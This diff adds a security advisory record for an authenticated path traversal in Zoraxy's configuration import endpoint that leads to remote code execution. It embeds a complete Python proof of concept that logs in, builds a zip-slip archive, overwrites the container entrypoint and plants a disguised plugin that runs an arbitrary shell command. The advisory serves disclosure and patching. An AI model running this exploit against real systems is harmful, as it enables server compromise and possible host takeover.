@@ -1,0 +1,58 @@
+{
+  "id": "GHSA-7pq3-326h-f8q9",
+  "modified": "2026-03-27T21:33:08.300468Z",
+  "published": "2026-03-25T20:04:44Z",
+  "aliases": [
+    "CVE-2026-33529",
+    "GO-2026-4844"
+  ],
+  "summary": "Zoraxy: Authenticated Path Traversal in Config Import leads to RCE",
+  "details": "# Authenticated Path Traversal to RCE via Configuration Import\n\n## Summary\n\nAn authenticated path traversal vulnerability in the configuration import endpoint allows an authenticated user to write arbitrary files outside the config directory, which can lead to RCE by creating a plugin.\n\n## Details\n\nThe vulnerable endpoint is `POST /api/conf/import`.\n\nThe zip entry names sanitization is bypassed by embedding `../` inside a longer sequence so the replacement produces a new `../`:\n\n```\nconf/..././..././entrypoint.py\n  → ReplaceAll(\"../\", \"\")  (match found at index 1 of \"..././\", leaving \"../\")\n  → conf/../../entrypoint.py   ← passes HasPrefix check, escapes conf/\n```\n\nUsing this endpoint, a new plugin can be written (persistent) and the entrypoint (non-persistent) can be edited to add execution permissions to the plugin.\nWhen the database is provided in the import, the program should exit to trigger a container restart (which does not happen because the entrypoint does not monitor the Zoraxy exit code).\nAs a result, the container was manually restarted for the PoC to work.\n\n## PoC\n\n```python\nimport argparse\nimport io\nimport json\nimport re\nimport sys\nimport zipfile\n\nimport requests\nimport urllib3\n\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nINTRO_SPEC_JSON = json.dumps({\n    \"id\": \"com.attacker.evil\",\n    \"name\": \"System Updater\",\n    \"author\": \"System\",\n    \"author_contact\": \"\",\n    \"description\": \"Internal system update module\",\n    \"url\": \"\",\n    \"ui_path\": \"/ui\",\n    \"type\": 1,\n    \"version_major\": 1,\n    \"version_minor\": 0,\n    \"version_patch\": 0,\n    \"permitted_api_endpoints\": [],\n})\n\nLINUX_START_SH = \"\"\"\\\n#!/bin/sh\nINTRO_SPEC='{intro_spec}'\n\nrun_payload() {{\n{payload_lines}\n}}\n\ncase \"$1\" in\n  -introspect)\n    run_payload\n    printf '%s\\\\n' \"$INTRO_SPEC\"\n    exit 0\n    ;;\n  -configure=*)\n    run_payload\n    while true; do sleep 3600; done\n    ;;\nesac\n\"\"\"\n\nMALICIOUS_ENTRYPOINT_PY = \"\"\"\\\n#!/usr/bin/env python3\nimport os, subprocess, signal, sys, time\n\ntry:\n    subprocess.run({cmd_list}, shell=False)\nexcept Exception:\n    pass\n\ntry:\n    os.chmod(\"/opt/zoraxy/plugin/evil/start.sh\", 0o755)\nexcept Exception:\n    pass\n\nzoraxy_proc = None\nzerotier_proc = None\n\ndef getenv(key, default=None):\n  return os.environ.get(key, default)\n\ndef run(command):\n  try:\n    subprocess.run(command, check=True)\n  except subprocess.CalledProcessError as e:\n    print(f\"Command failed: {command} - {e}\")\n    sys.exit(1)\n\ndef popen(command):\n  proc = subprocess.Popen(command)\n  time.sleep(1)\n  if proc.poll() is not None:\n    print(f\"{command} exited early with code {proc.returncode}\")\n    raise RuntimeError(f\"Failed to start {command}\")\n  return proc\n\ndef cleanup(_signum, _frame):\n  global zoraxy_proc, zerotier_proc\n  if zoraxy_proc and zoraxy_proc.poll() is None:\n    zoraxy_proc.terminate()\n  if zerotier_proc and zerotier_proc.poll() is None:\n    zerotier_proc.terminate()\n  if zoraxy_proc:\n    try:\n      zoraxy_proc.wait(timeout=8)\n    except subprocess.TimeoutExpired:\n      zoraxy_proc.kill()\n      zoraxy_proc.wait()\n  if zerotier_proc:\n    try:\n      zerotier_proc.wait(timeout=8)\n    except subprocess.TimeoutExpired:\n      zerotier_proc.kill()\n      zerotier_proc.wait()\n  try:\n    os.unlink(\"/var/lib/zerotier-one\")\n  except Exception:\n    pass\n  sys.exit(0)\n\ndef start_zerotier():\n  global zerotier_proc\n  config_dir = \"/opt/zoraxy/config/zerotier/\"\n  zt_path = \"/var/lib/zerotier-one\"\n  os.makedirs(config_dir, exist_ok=True)\n  try:\n    os.symlink(config_dir, zt_path, target_is_directory=True)\n  except FileExistsError:\n    pass\n  zerotier_proc = popen([\"zerotier-one\"])\n\ndef start_zoraxy():\n  global zoraxy_proc\n  zoraxy_args = [\n    \"zoraxy\",\n    f\"-autorenew={getenv('AUTORENEW', '86400')}\",\n    f\"-cfgupgrade={getenv('CFGUPGRADE', 'true')}\",\n    f\"-db={getenv('DB', 'auto')}\",\n    f\"-docker={getenv('DOCKER', 'true')}\",\n    f\"-earlyrenew={getenv('EARLYRENEW', '30')}\",\n    f\"-enablelog={getenv('ENABLELOG', 'true')}\",\n    f\"-fastgeoip={getenv('FASTGEOIP', 'false')}\",\n    f\"-mdns={getenv('MDNS', 'true')}\",\n    f\"-mdnsname={getenv('MDNSNAME', \\\"''\\\")}\",\n    f\"-noauth={getenv('NOAUTH', 'false')}\",\n    f\"-plugin={getenv('PLUGIN', '/opt/zoraxy/plugin/')}\",\n    f\"-port=:{getenv('PORT', '8000')}\",\n    f\"-sshlb={getenv('SSHLB', 'false')}\",\n    f\"-version={getenv('VERSION', 'false')}\",\n    f\"-webroot={getenv('WEBROOT', './www')}\",\n  ]\n  zoraxy_proc = popen(zoraxy_args)\n\ndef main():\n  signal.signal(signal.SIGTERM, cleanup)\n  signal.signal(signal.SIGINT, cleanup)\n  run([\"update-ca-certificates\"])\n  if getenv(\"UPDATE_GEOIP\", \"false\").lower() == \"true\":\n    run([\"zoraxy\", \"-update_geoip=true\"])\n  os.chdir(\"/opt/zoraxy/config/\")\n  if getenv(\"ZEROTIER\", \"false\") == \"true\":\n    start_zerotier()\n  start_zoraxy()\n  signal.pause()\n\nif __name__ == \"__main__\":\n  main()\n\"\"\"\n\n\ndef get_csrf(host: str, session: requests.Session) -\u003e tuple:\n    r = session.get(f\"{host}/login.html\", timeout=10, verify=False)\n    m = re.search(r'\u003cmeta[^\u003e]+name=[\"\\']zoraxy\\.csrf\\.Token[\"\\'][^\u003e]+content=[\"\\']([^\"\\']+)[\"\\']', r.text)\n    if not m:\n        m = re.search(r'\u003cmeta[^\u003e]+content=[\"\\']([^\"\\']+)[\"\\'][^\u003e]+name=[\"\\']zoraxy\\.csrf\\.Token[\"\\']', r.text)\n    token = m.group(1) if m else r.headers.get(\"X-CSRF-Token\", \"\")\n    return token, f\"{host}/login.html\"\n\n\ndef authenticate(host: str, username: str, password: str,\n                 session: requests.Session) -\u003e bool:\n    csrf, referer = get_csrf(host, session)\n    print(f\"    CSRF token  -\u003e {csrf!r}\")\n    r = session.post(\n        f\"{host}/api/auth/login\",\n        data={\"username\": username, \"password\": password},\n        headers={\"X-CSRF-Token\": csrf, \"Referer\": referer},\n        timeout=10, verify=False,\n    )\n    print(f\"    Login       -\u003e HTTP {r.status_code}  {r.text[:120]!r}\")\n    return r.status_code == 200 and r.text.strip().strip('\"').lower() in (\"ok\", \"true\")\n\n\ndef upload_zip(host: str, session: requests.Session, zip_bytes: bytes) -\u003e tuple:\n    csrf, referer = get_csrf(host, session)\n    r = session.post(\n        f\"{host}/api/conf/import\",\n        files={\"file\": (\"backup.zip\", zip_bytes, \"application/zip\")},\n        headers={\"X-CSRF-Token\": csrf, \"Referer\": referer},\n        timeout=30, verify=False,\n    )\n    return r.status_code, r.text\n\n\ndef export_config(host: str, session: requests.Session) -\u003e bytes | None:\n    r = session.get(\n        f\"{host}/api/conf/export?includeDB=true\",\n        timeout=60, verify=False,\n    )\n    if r.status_code == 200 and len(r.content) \u003e 100:\n        return r.content\n    return None\n\n\ndef build_zip(cmd: str, export_zip: bytes) -\u003e bytes:\n    traversal_ep = \"conf/..././..././entrypoint.py\"\n    traversal_sh = \"conf/..././..././plugin/evil/start.sh\"\n\n    payload_lines = \"\\n\".join(f\"  {line}\" for line in cmd.splitlines()) or \"  id \u003e /tmp/pwned.txt\"\n    start_sh = LINUX_START_SH.format(\n        intro_spec=INTRO_SPEC_JSON.replace(\"'\", \"'\\\\''\"),\n        payload_lines=payload_lines,\n    )\n    malicious_ep = MALICIOUS_ENTRYPOINT_PY.replace(\"{cmd_list}\", repr([\"sh\", \"-c\", cmd]))\n\n    buf = io.BytesIO()\n    with zipfile.ZipFile(io.BytesIO(export_zip), \"r\") as src:\n        with zipfile.ZipFile(buf, \"w\", zipfile.ZIP_DEFLATED) as zf:\n            for item in src.infolist():\n                zf.writestr(item, src.read(item.filename))\n            zf.writestr(zipfile.ZipInfo(traversal_ep), malicious_ep.encode())\n            zf.writestr(zipfile.ZipInfo(traversal_sh), start_sh.encode())\n    buf.seek(0)\n    return buf.read()\n\n\ndef main() -\u003e None:\n    parser = argparse.ArgumentParser(\n        description=\"Zoraxy Authenticated RCE via Entrypoint Overwrite + Plugin Zip-Slip\",\n    )\n    parser.add_argument(\"--host\",  help=\"Target, e.g. http://192.168.1.10:8000\")\n    parser.add_argument(\"--user\",  default=\"admin\")\n    parser.add_argument(\"--pass\",  dest=\"password\", default=None)\n    parser.add_argument(\"--cmd\", default=\"id \u003e /tmp/pwned.txt\",\n                        help=\"Shell command to embed in the payload\")\n    args = parser.parse_args()\n\n    if not args.host or not args.password:\n        parser.error(\"--host and --pass are required\")\n    host = args.host.rstrip(\"/\")\n\n    print(f\"\\n[1] Authenticating as '{args.user}' at {host} ...\")\n    session = requests.Session()\n    if not authenticate(host, args.user, args.password, session):\n        print(\"[-] Authentication failed.\")\n        sys.exit(1)\n    print(\"[+] Authenticated.\")\n\n    print(f\"\\n[2] Exporting live config ...\")\n    export_zip = export_config(host, session)\n    if not export_zip:\n        print(\"[-] Config export failed.\")\n        sys.exit(1)\n    print(\"\\n[3] Building malicious zip ...\")\n    zip_bytes = build_zip(args.cmd, export_zip)\n    print(f\"[+] Zip size: {len(zip_bytes):,} bytes\")\n\n    print(f\"\\n[4] Uploading via POST {host}/api/conf/import ...\")\n    code, body = upload_zip(host, session, zip_bytes)\n    print(f\"    HTTP {code}  {body[:200]!r}\")\n    if code != 200:\n        print(\"[-] Upload failed.\")\n        sys.exit(1)\n    print(\"[+] Files written\")\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\n## Impact\n\nArbitrary file write leads to RCE by an authenticated user. Given that the Docker socket might be mapped, this issue can lead to full host takeover.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/tobychui/zoraxy",
+        "purl": "pkg:golang/github.com/tobychui/zoraxy"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "3.3.2"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/03/GHSA-7pq3-326h-f8q9/GHSA-7pq3-326h-f8q9.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/tobychui/zoraxy/security/advisories/GHSA-7pq3-326h-f8q9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33529"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tobychui/zoraxy/commit/69ac755aeec5d15ba4c62099f7f1ed77a855b40b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/tobychui/zoraxy"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/tobychui/zoraxy/releases/tag/v3.3.2"
+    }
+  ]
+}
